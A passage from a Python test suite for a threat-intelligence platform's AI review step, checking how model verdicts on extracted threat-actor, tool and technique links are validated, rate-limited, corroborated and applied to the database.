            {"verdicts": [{"item_id": f"edge:{edge.id}", "verdict": "keep", "confidence": "high"}]}, items
        )
        cfg = await adj._settings(db_session)
        await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
        await db_session.flush()
        await db_session.refresh(edge)

    e1, e2, e3 = [await _make_entry(db_session, feed) for _ in range(3)]
    await keep_from(e1)
    await keep_from(e1)  # same entry again does not count twice
    assert len(edge.reviewer_kept_entry_ids) == 1 and edge.confidence == "probable"
    await keep_from(e2)
    assert len(edge.reviewer_kept_entry_ids) == 2 and edge.confidence == "probable"
    await keep_from(e3)
    assert len(edge.reviewer_kept_entry_ids) == 3
    assert edge.confidence == "confirmed" and edge.adjudication_verdict == "corroborated"


@pytest.mark.asyncio
async def test_keep_counter_never_touches_shadow_or_demoted_edges(db_session: AsyncSession, feed):
    await _seed_settings(db_session, adjudication_mode="shadow")
    entry = await _make_entry(db_session, feed)
    warlock = await _link_actor(db_session, entry, "Warlock", source="ai")
    cobalt = Tool(name="Cobalt Strike", article_count=40)
    db_session.add(cobalt)
    await db_session.flush()
    edge = EntityRelationship(
        source_type="threat_actor",
        source_id=warlock.id,
        target_type="tool",
        target_id=cobalt.id,
        relationship_type="uses",
        confidence="probable",
        source="auto_extracted",
        evidence_entry_ids=[entry.id],
    )
    db_session.add(edge)
    await db_session.flush()
    items, _ = await build_manifest(db_session, entry, _payload())
    verdicts, _ = _validate_verdicts(
        {"verdicts": [{"item_id": f"edge:{edge.id}", "verdict": "keep", "confidence": "high"}]}, items
    )
    cfg = await adj._settings(db_session)
    await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.refresh(edge)
    assert edge.reviewer_kept_entry_ids == []


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("source", "verdict"),
    [
        ("analyst_confirmed", None),
        ("analyst_created", None),
        ("external_feed", None),
        ("auto_extracted", "corroborated"),
    ],
)
async def test_demote_never_touches_analyst_or_corroborated_edges(db_session: AsyncSession, feed, source, verdict):
    """One article failing to assert a claim is not grounds to overrule an
    analyst, an external catalogue, or the three reviews that corroborated it."""
    entry = await _make_entry(db_session, feed)
    edge = await _edge_for(db_session, entry)
    edge.source = source
    edge.confidence = "confirmed"
    edge.adjudication_verdict = verdict
    await db_session.flush()

    assert await adj._demote_edge(db_session, edge.id, "roundup co-mention") is None
    await db_session.refresh(edge)
    assert (edge.confidence, edge.adjudication_verdict) == ("confirmed", verdict)


async def _edge_for(db_session, entry, name="Warlock"):
    """An AI-asserted edge on this entry, the shape the manifest reviews."""
    actor = await _link_actor(db_session, entry, name, source="ai")
    cobalt = Tool(name=f"Cobalt Strike {uuid.uuid4().hex[:6]}", article_count=40)
    db_session.add(cobalt)
    await db_session.flush()
    edge = EntityRelationship(
        source_type="threat_actor",
        source_id=actor.id,
        target_type="tool",
        target_id=cobalt.id,
        relationship_type="uses",
        confidence="probable",
        source="auto_extracted",
        description=f"{name} deploys Cobalt Strike",
        evidence_entry_ids=[entry.id],
    )
    db_session.add(edge)
    await db_session.flush()
    return edge


@pytest.mark.asyncio
async def test_silence_on_an_edge_is_not_corroboration(db_session: AsyncSession, feed):
    """The prompt asks for changes only, so an unmentioned edge comes back as a
    filled-in keep. Counting those would promote a relationship to `confirmed`
    on three reviews that never weighed in — corroboration has to be something
    the reviewer actually said."""
    await _seed_settings(db_session, adjudication_mode="apply")
    entry = await _make_entry(db_session, feed)
    edge = await _edge_for(db_session, entry)

    items, _ = await build_manifest(db_session, entry, _payload())
    assert any(it.item_id == f"edge:{edge.id}" for it in items)
    # An empty verdict list: every item keeps, none of it explicit.
    verdicts, _stats = _validate_verdicts({"verdicts": []}, items)
    edge_verdict = next(v for v in verdicts if v.item.item_id == f"edge:{edge.id}")
    assert edge_verdict.verdict == "keep" and edge_verdict.explicit is False

    cfg = await adj._settings(db_session)
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.refresh(edge)
    assert edge.reviewer_kept_entry_ids == []
    assert detail["promoted"] == 0 and edge.confidence == "probable"


@pytest.mark.asyncio
async def test_a_low_confidence_keep_does_not_corroborate_either(db_session: AsyncSession, feed):
    """A keep is the one verdict that raises trust rather than lowering it, so
    it clears the same confidence floor the destructive verdicts do."""
    await _seed_settings(db_session, adjudication_mode="apply")  # floor defaults to high
    entry = await _make_entry(db_session, feed)
    edge = await _edge_for(db_session, entry)

    items, _ = await build_manifest(db_session, entry, _payload())
    verdicts, _stats = _validate_verdicts(
        {"verdicts": [{"item_id": f"edge:{edge.id}", "verdict": "keep", "confidence": "low"}]}, items
    )
    edge_verdict = next(v for v in verdicts if v.item.item_id == f"edge:{edge.id}")
    assert edge_verdict.explicit is True  # said, but not confidently

    cfg = await adj._settings(db_session)
    await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.refresh(edge)
    assert edge.reviewer_kept_entry_ids == []


def test_the_prompt_still_demands_a_verdict_on_every_edge():
    """The changes-only rule would otherwise retire edge corroboration
    outright: the reviewer would never volunteer a keep again. Edges are capped
    at 10 per article, so answering on all of them is affordable."""
    from app.ai.prompts.defaults import SYSTEM_TASKS

    task = next(t for t in SYSTEM_TASKS if t["name"] == "entry_adjudication")
    system = task["default_system_template"]
    assert "Every `edge:` item needs a verdict, keep or demote." in system
    assert "counted as corroboration" in system
    assert "`edge:` item" in task["default_prompt_template"]
    # New entities too: silence is not a verdict on something just minted.
    assert 'Every link marked "NEW, created by this article" needs a verdict' in system
    assert "every item marked NEW" in task["default_prompt_template"]


@pytest.mark.asyncio
async def test_stale_status_is_a_live_filter(client, admin_headers, db_session: AsyncSession, feed):
    from datetime import timedelta

    entry = await _make_entry(db_session, feed)
    old = ThreatActor(
        name="tortilla crew",
        article_count=1,
        created_via="ai_extraction",
        created_from_entry_id=entry.id,
        first_seen_at=datetime.now(UTC) - timedelta(days=205),
        last_seen_at=datetime.now(UTC) - timedelta(days=205),
    )
    fresh = ThreatActor(
        name="Warlock Group", article_count=1, created_via="ai_extraction", created_from_entry_id=entry.id
    )
    db_session.add_all([old, fresh])
    await db_session.commit()
    resp = await client.get(
        "/api/engine/extraction/entities", params={"status": "stale", "window": "all"}, headers=admin_headers
    )
    assert resp.status_code == 200, resp.text
    names = {i["name"] for i in resp.json()["items"]}
    assert names == {"tortilla crew"}


@pytest.mark.asyncio
async def test_backfill_selects_only_undecided_analysed_entries(db_session: AsyncSession, feed):
    from app.models.ai_result import AIResult
    from app.models.ai_task import AITask

    task = AITask(
        name="entry_analysis", display_name="t", description="", category="extraction", default_prompt_template="x"
    )
    db_session.add(task)
    await db_session.flush()

    async def analysed(entry):
        db_session.add(
            AIResult(
                entry_id=entry.id,
                target_type="entry",
                target_id=entry.id,
                is_current=True,
                task_id=task.id,
                prompt_used="",
                raw_response="",
                parsed_result=_payload(),
            )
        )

    undecided = await _make_entry(db_session, feed)
    await analysed(undecided)
    waiting = await _make_entry(db_session, feed)
    await analysed(waiting)
    row = await _request(db_session, waiting)
    row.adjudication_status = adj.SKIPPED_BUDGET
    done = await _make_entry(db_session, feed)
    await analysed(done)
    row = await _request(db_session, done)
    row.adjudication_status = adj.COMPLETED
    row.adjudicated_at = datetime.now(UTC)
    never_analysed = await _make_entry(db_session, feed)
    await db_session.flush()

    picked = set(await adj.select_backfill_entries(db_session))
    assert picked == {undecided.id, waiting.id}
    assert done.id not in picked and never_analysed.id not in picked


@pytest.mark.asyncio
async def test_legacy_proposals_are_shown_to_the_reviewer_then_superseded(db_session: AsyncSession, feed):
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    storm = await _link_actor(db_session, entry, "Storm")
    minted = await _link_actor(db_session, entry, "Water Utility Co", source="ai", minted=True, article_count=1)
    db_session.add(
        EntityLinkValidationLog(
            entry_id=entry.id,
            entity_type="threat_actor",
            entity_id=storm.id,
            entity_name_snapshot="Storm",
            action="shadow_remove",
            reason="nightly validator thought it was weather",
        )
    )
    db_session.add(
        EntityMaintenanceLog(
            entity_type="threat_actor",
            entity_id=minted.id,
            action="stale_entity_review",
            mode="shadow",
            before={"entity": {"name": "Water Utility Co"}},
            after={},
            reasoning="1 article, no relationships",
            applied=False,
        )
    )
    # A name-normalization proposal comes from a scanner that still runs: the
    # reviewer renders no verdict about names, so it must survive the review.
    db_session.add(
        EntityMaintenanceLog(
            entity_type="threat_actor",
            entity_id=minted.id,
            action="normalize_name",
            mode="shadow",
            before={"entity": {"name": "Water Utility Co"}},
            after={"proposed_name": "Water Utility Company"},
            reasoning="expand abbreviation",
            applied=False,
        )
    )
    await db_session.flush()

    legacy: list = []
    items, block = await build_manifest(db_session, entry, _payload(), legacy_out=legacy)
    assert "earlier suggestion (retired nightly job): remove — nightly validator thought it was weather" in block
    assert "earlier suggestion (retired nightly job): stale entity review" in block
    assert "normalize name" not in block

    # Collected while the manifest was built — before the model runs — so the
    # reviewer's own rows can never be mistaken for a retired job's.
    assert sorted(r.action for r in legacy) == ["shadow_remove", "stale_entity_review"]
    superseded = await adj.supersede_legacy_proposals(db_session, legacy)
    await db_session.flush()
    assert superseded == 2
    assert (await db_session.execute(select(EntityLinkValidationLog))).scalars().all() == []
    remaining = (await db_session.execute(select(EntityMaintenanceLog))).scalars().all()
    assert [r.action for r in remaining] == ["normalize_name"]


# ------------------------------------------------------------------ review round 2: gaps the audit found


@pytest.mark.asyncio
async def test_enqueue_plan_gate_only_when_pipeline_plans_are_on(db_session: AsyncSession, feed):
    from app.models.pipeline_plan import PipelinePlan

    await _seed_settings(db_session, pipeline_engine_enabled=True)
    db_session.add(
        PipelinePlan(
            name="quiet vendor blog",
            scope_type="feed",
            scope_id=feed.id,
            stages={"adjudicate": {"enabled": False}},
            is_active=True,
        )
    )
    entry = await _make_entry(db_session, feed)
    await _request(db_session, entry)
    await db_session.flush()
    assert await enqueue_adjudication(db_session, entry.id, {}, _payload()) == adj.SKIPPED_PLAN


@pytest.mark.asyncio
async def test_settings_keep_a_stored_zero(db_session: AsyncSession):
    await _seed_settings(db_session, adjudication_max_per_hour=0, adjudication_circuit_breaker_pct=0)
    cfg = await adj._settings(db_session)
    assert cfg["max_per_hour"] == 0 and cfg["breaker_pct"] == 0.0


@pytest.mark.asyncio
async def test_created_trigger_sees_sector_and_ai_ttp_rows(db_session: AsyncSession, feed):
    from app.models.entry_sector import EntrySector
    from app.models.sector import Sector
    from app.models.ttp import TTP, EntryTTP

    entry = await _make_entry(db_session, feed)
    assert not await adj._created_something(db_session, entry.id, {})

    sector = Sector(name="Energy Utilities (adj test)", slug="energy-utilities-adj-test")
    db_session.add(sector)
    await db_session.flush()
    db_session.add(
        EntrySector(entry_id=entry.id, sector=sector.slug, sector_id=sector.id, source="ai", confidence="high")
    )
    await db_session.flush()
    assert await adj._created_something(db_session, entry.id, {})

    other = await _make_entry(db_session, feed)
    ttp = TTP(technique_id="T1486", technique_name="Data Encrypted for Impact", tactic="impact")
    db_session.add(ttp)
    await db_session.flush()
    db_session.add(EntryTTP(entry_id=other.id, ttp_id=ttp.id, source_text="auto_link:T1486", confidence="high"))
    await db_session.flush()
    assert not await adj._created_something(db_session, other.id, {})  # autolinker row is not "created"
    # An AI-asserted TTP: the autolinker prefix is absent.
    ai_entry = await _make_entry(db_session, feed)
    db_session.add(EntryTTP(entry_id=ai_entry.id, ttp_id=ttp.id, source_text="encrypted the files", confidence="high"))
    await db_session.flush()
    assert await adj._created_something(db_session, ai_entry.id, {})


@pytest.mark.asyncio
async def test_budget_breaker_and_backfill_share(db_session: AsyncSession, monkeypatch):
    _use_fake_redis(monkeypatch)
    # max 4: live entries take the whole hour, backfill only half of it.
    assert await adj._consume_hour_budget(4, backfill=True) is None
    assert await adj._consume_hour_budget(4, backfill=True) is None
    assert await adj._consume_hour_budget(4, backfill=True) == "budget"
    assert await adj._consume_hour_budget(4) is None
    assert await adj._consume_hour_budget(4) is None
    assert await adj._consume_hour_budget(4) == "budget"

    # The rolling breaker needs a sample, then pauses dispatch for an hour.
    for _ in range(9):
        assert not await adj._rolling_breaker(1.0, 0.5)
    assert await adj.breaker_paused_until() is None
    assert await adj._rolling_breaker(1.0, 0.5)
    assert await adj.breaker_paused_until() is not None
    assert await adj._consume_hour_budget(100) == "breaker"


@pytest.mark.asyncio
async def test_a_zero_budget_is_no_ceiling_not_one_an_hour(monkeypatch):
    """0 reads as "off" on the sibling score floor, and an operator whose
    provider keeps up with ingest should be able to turn the ceiling off.
    `max(1, …)` used to turn 0 into the most restrictive setting there is."""
    _use_fake_redis(monkeypatch)
    for _ in range(50):
        assert await adj._consume_hour_budget(0) is None
    # No share to run out of either: the backfill's own limit is the brake.
    for _ in range(50):
        assert await adj._consume_hour_budget(0, backfill=True) is None
    # The breaker still outranks it — an uncapped install is not an unguarded one.
    for _ in range(10):
        await adj._rolling_breaker(1.0, 0.5)
    assert await adj._consume_hour_budget(0) == "breaker"


@pytest.mark.asyncio
async def test_resweep_requeues_budget_paused_and_lost_rows(db_session: AsyncSession, feed, monkeypatch):
    from datetime import timedelta

    await _seed_settings(db_session)

    async def _parsed(db, entry_id):
        return None, _payload()

    dispatched: list = []
    monkeypatch.setattr(adj, "_current_analysis", _parsed)
    monkeypatch.setattr(adj, "_ai_queue_depth", _zero_depth)
    monkeypatch.setattr(adj, "dispatch_adjudication", lambda entry_id, countdown=5: dispatched.append(entry_id))

    long_ago = datetime.now(UTC) - timedelta(hours=adj.STALE_PENDING_HOURS + 1)
    rows = {}
    for label, status, queued_at in (
        ("budget", adj.SKIPPED_BUDGET, None),
        ("paused", adj.SKIPPED_PAUSED, None),
        ("lost", adj.PENDING, long_ago),
        ("recheck", adj.RECHECK, None),
        ("queued", adj.PENDING, datetime.now(UTC)),
        ("done", adj.COMPLETED, None),
    ):
        entry = await _make_entry(db_session, feed)
        row = await _request(db_session, entry)
        row.adjudication_status = status
        row.adjudication_queued_at = queued_at
        rows[label] = row
    await db_session.flush()

    result = await adj.resweep_adjudications(db_session)
    await db_session.flush()
    assert result["swept"] == 4
    for label in ("budget", "paused", "lost", "recheck"):
        await db_session.refresh(rows[label])
        assert rows[label].adjudication_status == adj.PENDING, label
        assert rows[label].entry_id in dispatched
    assert rows["lost"].adjudication_queued_at > long_ago
    assert rows["queued"].entry_id not in dispatched
    assert rows["done"].adjudication_status == adj.COMPLETED


@pytest.mark.asyncio
async def test_resweep_marks_rows_without_an_analysis_failed(db_session: AsyncSession, feed, monkeypatch):
    await _seed_settings(db_session)

    async def _none(db, entry_id):
        return None, None

    monkeypatch.setattr(adj, "_current_analysis", _none)
    monkeypatch.setattr(adj, "_ai_queue_depth", _zero_depth)
    entry = await _make_entry(db_session, feed)
    row = await _request(db_session, entry)
    row.adjudication_status = adj.SKIPPED_BUDGET
    await db_session.flush()
    await adj.resweep_adjudications(db_session)
    await db_session.flush()
    await db_session.refresh(row)
    assert row.adjudication_status == adj.FAILED


@pytest.mark.asyncio
async def test_reclassify_waits_for_consensus_then_converts_in_apply_mode(
    client, admin_headers, db_session: AsyncSession, feed
):
    """One article's say-so files a reclassify as a proposal (a vote); the
    second article that agrees, at the confidence floor, converts the entity
    and settles every pending proposal about it. The queue's Apply still
    works on the first proposal alone."""
    await _seed_settings(db_session, adjudication_mode="apply", adjudication_reclassify_consensus=2)
    entry = await _make_entry(db_session, feed)
    tool = Tool(name="Warlock", article_count=1, created_from_entry_id=entry.id)
    db_session.add(tool)
    await db_session.flush()
    db_session.add(EntryTool(entry_id=entry.id, tool_id=tool.id, confidence="high", source="ai"))
    await db_session.flush()
    raw = [
        {
            "item_id": f"link:tool:{tool.id}",
            "verdict": "reclassify",
            "suggested_type": "malware",
            "confidence": "high",
            "reason": "Warlock is a ransomware family",
        }
    ]
    _items, verdicts = await _verdicts_for(db_session, entry, raw)
    cfg = await adj._settings(db_session)
    assert cfg["reclassify_consensus"] == 2
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.commit()
    # First vote: filed, not applied — the link is intact and the tool still exists.
    assert detail["verdicts"] == {"reclassify": 1} and detail["applied"] == 0 and detail["shadowed"] == 1
    assert (await db_session.execute(select(EntryTool).where(EntryTool.entry_id == entry.id))).scalar_one()
    rows = (await db_session.execute(select(EntityMaintenanceLog))).scalars().all()
    assert [r.action for r in rows] == [adj.ACTION_RECLASSIFY]
    assert rows[0].after["suggested_type"] == "malware" and rows[0].after["agreement"] == 1 and not rows[0].applied

    # A second article agreeing reaches the consensus: converted inline, the
    # first article's proposal cleared, an applied audit row written.
    entry2 = await _make_entry(db_session, feed)
    db_session.add(EntryTool(entry_id=entry2.id, tool_id=tool.id, confidence="high", source="ai"))
    await db_session.flush()
    tool_id, entry_id, entry2_id = tool.id, entry.id, entry2.id
    _items, verdicts = await _verdicts_for(db_session, entry2, raw)
    detail = await apply_verdicts(db_session, entry2, verdicts, _payload(), cfg)
    await db_session.commit()
    db_session.expire_all()
    assert detail["applied"] == 1 and detail["shadowed"] == 0
    assert (await db_session.execute(select(Tool).where(Tool.id == tool_id))).scalar_one_or_none() is None
    malware = (await db_session.execute(select(MalwareFamily).where(MalwareFamily.name == "Warlock"))).scalar_one()
    linked = {
        r.entry_id
        for r in (await db_session.execute(select(EntryMalware).where(EntryMalware.malware_family_id == malware.id)))
        .scalars()
        .all()
    }
    assert linked == {entry_id, entry2_id}
    rows = (
        (
            await db_session.execute(
                select(EntityMaintenanceLog).where(EntityMaintenanceLog.action == adj.ACTION_RECLASSIFY)
            )
        )
        .scalars()
        .all()
    )
    assert [r.applied for r in rows] == [True]
    assert rows[0].after["agreement"] == 2 and rows[0].after["outcome"]["target_type"] == "malware"


@pytest.mark.asyncio
async def test_reclassify_consensus_of_one_converts_on_the_first_verdict(db_session: AsyncSession, feed):
    await _seed_settings(db_session, adjudication_mode="apply", adjudication_reclassify_consensus=1)
    entry = await _make_entry(db_session, feed)
    tool = Tool(name="Warlock", article_count=1, created_from_entry_id=entry.id)
    db_session.add(tool)
    await db_session.flush()
    db_session.add(EntryTool(entry_id=entry.id, tool_id=tool.id, confidence="high", source="ai"))
    await db_session.flush()
    tool_id = tool.id
    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [
            {
                "item_id": f"link:tool:{tool.id}",
                "verdict": "reclassify",
                "suggested_type": "malware",
                "confidence": "high",
                "reason": "Warlock is a ransomware family",
            }
        ],
    )
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    await db_session.commit()
    db_session.expire_all()
    assert detail["applied"] == 1
    assert (await db_session.execute(select(Tool).where(Tool.id == tool_id))).scalar_one_or_none() is None
    assert (await db_session.execute(select(MalwareFamily).where(MalwareFamily.name == "Warlock"))).scalar_one()


@pytest.mark.asyncio
async def test_reclassify_below_confidence_floor_is_only_a_vote(db_session: AsyncSession, feed):
    await _seed_settings(db_session, adjudication_mode="apply", adjudication_reclassify_consensus=1)
    entry = await _make_entry(db_session, feed)
    tool = Tool(name="Warlock", article_count=1, created_from_entry_id=entry.id)
    db_session.add(tool)
    await db_session.flush()
    db_session.add(EntryTool(entry_id=entry.id, tool_id=tool.id, confidence="high", source="ai"))
    await db_session.flush()
    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [
            {
                "item_id": f"link:tool:{tool.id}",
                "verdict": "reclassify",
                "suggested_type": "malware",
                "confidence": "medium",
                "reason": "Warlock is a ransomware family",
            }
        ],
    )
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    await db_session.commit()
    assert detail["applied"] == 0 and detail["shadowed"] == 1
    assert (await db_session.execute(select(Tool).where(Tool.id == tool.id))).scalar_one()
    row = (await db_session.execute(select(EntityMaintenanceLog))).scalar_one()
    assert row.action == adj.ACTION_RECLASSIFY and not row.applied


@pytest.mark.asyncio
async def test_reclassify_back_into_a_folded_type_is_dropped_unfiled(db_session: AsyncSession, feed):
    """Warlock was folded out of malware into tool (tombstone). A later review
    proposing tool → malware would start a ping-pong, so it is dropped:
    no proposal filed, nothing converted, counted on the run detail."""
    from app.models.entity_maintenance import EntityReclassifyTombstone

    await _seed_settings(db_session, adjudication_mode="apply", adjudication_reclassify_consensus=1)
    entry = await _make_entry(db_session, feed)
    tool = Tool(name="Warlock", article_count=1, created_from_entry_id=entry.id)
    db_session.add(tool)
    await db_session.flush()
    db_session.add(EntryTool(entry_id=entry.id, tool_id=tool.id, confidence="high", source="ai"))
    db_session.add(
        EntityReclassifyTombstone(
            normalized_name="warlock", source_type="malware", target_type="tool", target_id=tool.id
        )
    )
    await db_session.flush()
    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [
            {
                "item_id": f"link:tool:{tool.id}",
                "verdict": "reclassify",
                "suggested_type": "malware",
                "confidence": "high",
                "reason": "Warlock is a ransomware family",
            }
        ],
    )
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    await db_session.commit()
    assert detail["reclassify_flip_guarded"] == 1 and detail["applied"] == 0 and detail["shadowed"] == 0
    assert (await db_session.execute(select(Tool).where(Tool.id == tool.id))).scalar_one()
    assert (await db_session.execute(select(EntityMaintenanceLog))).scalars().all() == []


@pytest.mark.asyncio
async def test_validate_coerces_reclassify_on_non_convertible_types(db_session: AsyncSession, feed):
    from app.models.ttp import TTP, EntryTTP

    entry = await _make_entry(db_session, feed)
    ttp = TTP(technique_id="T1486", technique_name="Data Encrypted for Impact", tactic="impact")
    db_session.add(ttp)
    await db_session.flush()
    db_session.add(EntryTTP(entry_id=entry.id, ttp_id=ttp.id, source_text="encrypted the files", confidence="high"))
    await db_session.flush()
    items, _ = await build_manifest(db_session, entry, _payload())
    verdicts, stats = _validate_verdicts(
        {"verdicts": [{"item_id": f"link:ttp:{ttp.id}", "verdict": "reclassify", "suggested_type": "malware"}]},
        items,
    )
    assert [v.verdict for v in verdicts] == ["keep"] and stats["coerced"] == 1


@pytest.mark.asyncio
async def test_a_link_log_restore_shields_the_link_but_a_tool_link_is_not_shielded(db_session: AsyncSession, feed):
    """The 90-day "never touched" guard reads the link log, which records a
    restore per entry per link — so it covers the five validator junction
    types and nothing else. A restore on the maintenance side writes an
    ACTION_RESTORED audit line that does not say which junction it put back,
    so tool / sector / TTP links get no shield and are reviewed again."""
    await _seed_settings(db_session, adjudication_mode="apply", adjudication_circuit_breaker_pct=0.9)
    entry = await _make_entry(db_session, feed)
    storm = await _link_actor(db_session, entry, "Storm")
    await _link_actor(db_session, entry, "Nightspire", article_count=5)  # kept: keeps the breaker shut
    cobalt = Tool(name="Cobalt Strike", article_count=40)
    db_session.add(cobalt)
    await db_session.flush()
    db_session.add(EntryTool(entry_id=entry.id, tool_id=cobalt.id, confidence="high", source="ai"))
    # An analyst restored the Storm link through the link log.
    db_session.add(
        EntityLinkValidationLog(
            entry_id=entry.id,
            entity_type="threat_actor",
            entity_id=storm.id,
            entity_name_snapshot="Storm",
            action="restored",
            reason="analyst: this is the tracked actor",
        )
    )
    await db_session.flush()

    items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [
            {
                "item_id": f"link:threat_actor:{storm.id}",
                "verdict": "remove",
                "confidence": "high",
                "reason": "Storm x",
            },
            {
                "item_id": f"link:tool:{cobalt.id}",
                "verdict": "remove",
                "confidence": "high",
                "reason": "Cobalt Strike y",
            },
        ],
    )
    by_id = {it.item_id: it for it in items}
    assert by_id[f"link:threat_actor:{storm.id}"].previously_restored
    assert "it will not be changed" in by_id[f"link:threat_actor:{storm.id}"].line
    assert not by_id[f"link:tool:{cobalt.id}"].previously_restored

    cfg = await adj._settings(db_session)
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.flush()
    # The shielded actor link is only flagged; the tool link actually goes.
    assert detail["mode"] == "apply" and detail["applied"] == 1
    assert (
        await db_session.execute(
            select(EntryThreatActor).where(
                EntryThreatActor.entry_id == entry.id, EntryThreatActor.threat_actor_id == storm.id
            )
        )
    ).scalar_one()
    assert (
        await db_session.execute(select(EntryTool).where(EntryTool.entry_id == entry.id))
    ).scalar_one_or_none() is None
    link_log = (
        await db_session.execute(
            select(EntityLinkValidationLog).where(EntityLinkValidationLog.action == "shadow_remove")
        )
    ).scalar_one()
    assert link_log.entity_id == storm.id
    unlink = (
        await db_session.execute(select(EntityMaintenanceLog).where(EntityMaintenanceLog.action == ACTION_UNLINK))
    ).scalar_one()
    assert unlink.entity_id == cobalt.id and unlink.applied is True


@pytest.mark.asyncio
async def test_a_failed_merge_does_not_sink_the_rest_of_the_run(db_session: AsyncSession, feed, monkeypatch):
    await _seed_settings(db_session, adjudication_mode="apply", adjudication_circuit_breaker_pct=0.9)
    entry = await _make_entry(db_session, feed)
    crew = ThreatActor(name="Warlock Crew", aliases=["Warlock Group"], article_count=9)
    db_session.add(crew)
    await db_session.flush()
    group = await _link_actor(db_session, entry, "Warlock Group", source="ai", minted=True, article_count=1)
    storm = await _link_actor(db_session, entry, "Storm")
    keep = await _link_actor(db_session, entry, "Nightspire", article_count=5)

    async def _boom(db, entity_type, entity_id, target, reason):
        # Leave the session dirty the way a failed flush would.
        db.add(ThreatActor(name="Warlock Crew", article_count=0))  # duplicate name → IntegrityError on flush
        await db.flush()
        raise AssertionError("unreachable")

    monkeypatch.setattr(adj, "_merge_entity", _boom)
    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [
            {
                "item_id": f"link:threat_actor:{group.id}",
                "verdict": "merge",
                "merge_into": "Warlock Crew",
                "confidence": "high",
            },
            {
                "item_id": f"link:threat_actor:{storm.id}",
                "verdict": "remove",
                "confidence": "high",
                "reason": "Storm w",
            },
            {"item_id": f"link:threat_actor:{keep.id}", "verdict": "keep", "confidence": "high"},
        ],
    )
    cfg = await adj._settings(db_session)
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.commit()
    assert detail["mode"] == "apply" and detail["applied"] == 1  # the remove went through
    merge_row = (
        await db_session.execute(select(EntityMaintenanceLog).where(EntityMaintenanceLog.action == ACTION_MERGE))
    ).scalar_one()
    assert not merge_row.applied and "error" in merge_row.after
    assert (
        await db_session.execute(select(EntryThreatActor).where(EntryThreatActor.threat_actor_id == storm.id))
    ).scalar_one_or_none() is None


@pytest.mark.asyncio
async def test_merge_is_not_counted_by_the_breaker(db_session: AsyncSession, feed):
    await _seed_settings(db_session, adjudication_mode="apply")
    entry = await _make_entry(db_session, feed)
    crew = ThreatActor(name="Warlock Crew", aliases=["Warlock Group"], article_count=9)
    db_session.add(crew)
    await db_session.flush()
    group = await _link_actor(db_session, entry, "Warlock Group", source="ai", minted=True, article_count=1)
    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [
            {
                "item_id": f"link:threat_actor:{group.id}",
                "verdict": "merge",
                "merge_into": "warlock group",
                "confidence": "high",
            }
        ],
    )
    cfg = await adj._settings(db_session)
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    assert detail["breaker"] is False and detail["mode"] == "apply" and detail["applied"] == 1
    assert "merge" not in adj.DESTRUCTIVE


async def _run_task_with(db_session: AsyncSession, monkeypatch, entry, ai_result: dict) -> dict:
    """Run the adjudicate task on ``entry`` against this session, with the
    model answering ``ai_result``."""
    from contextlib import asynccontextmanager

    from app.models.ai_result import AIResult
    from app.models.ai_task import AITask
    from app.models.user import User
    from app.workers import adjudication_tasks as tasks

    system = User(username="system", password_hash="x", role="system")
    db_session.add(system)
    task_row = AITask(
        name="entry_analysis", display_name="t", description="", category="extraction", default_prompt_template="x"
    )
    db_session.add(task_row)
    await db_session.flush()
    db_session.add(
        AIResult(
            entry_id=entry.id,
            target_type="entry",
            target_id=entry.id,
            is_current=True,
            task_id=task_row.id,
            prompt_used="",
            raw_response="",
            parsed_result=_payload(),
        )
    )
    await db_session.flush()

    @asynccontextmanager
    async def fake_session():
        yield db_session

    async def fake_run_task(db, user_id, task_name, variables, **kwargs):
        return ai_result

    class _Lock:
        def set(self, *a, **k):
            return True

        def delete(self, *a, **k):
            return 1

    async def fake_system_user(db):
        return system.id

    async def noop_commit():
        await db_session.flush()

    monkeypatch.setattr(tasks, "worker_session", fake_session)
    monkeypatch.setattr(tasks, "_redis_client", _Lock())
    monkeypatch.setattr("app.ai.engine.run_task", fake_run_task)
    monkeypatch.setattr("app.services.system_user.get_system_user_id", fake_system_user)
    monkeypatch.setattr(db_session, "commit", noop_commit)
    return await tasks._adjudicate_entry(entry.id)


@pytest.mark.asyncio
async def test_task_parks_a_paused_provider_for_the_sweep(db_session: AsyncSession, feed, monkeypatch):
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    await _request(db_session, entry)
    await _link_actor(db_session, entry, "Storm")
    detail = await _run_task_with(
        db_session,
        monkeypatch,
        entry,
        {"_extraction_status": "provider_paused", "_pause_until": "2026-10-08T12:00:00+00:00"},
    )
    assert detail["skipped"] == "provider_paused"
    row = (
        await db_session.execute(select(AIAnalysisRequest).where(AIAnalysisRequest.entry_id == entry.id))
    ).scalar_one()
    assert row.adjudication_status == adj.SKIPPED_PAUSED
    assert (await db_session.execute(select(EntityLinkValidationLog))).scalars().all() == []


@pytest.mark.asyncio
async def test_bulk_apply_and_origin_scoped_dismiss(client, admin_headers, db_session: AsyncSession, feed):
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    victim = await _link_actor(db_session, entry, "Water Utility Co", source="ai", minted=True, article_count=1)
    cobalt = Tool(name="Cobalt Strike", article_count=40)
    db_session.add(cobalt)
    await db_session.flush()
    db_session.add(EntryTool(entry_id=entry.id, tool_id=cobalt.id, confidence="high", source="ai"))
    # A legacy (scanner) proposal that must survive an adjudicator-scoped dismiss.
    db_session.add(
        EntityMaintenanceLog(
            entity_type="tool",
            entity_id=cobalt.id,
            action="normalize_name",
            mode="shadow",
            before={"entity": {"name": "Cobalt Strike"}},
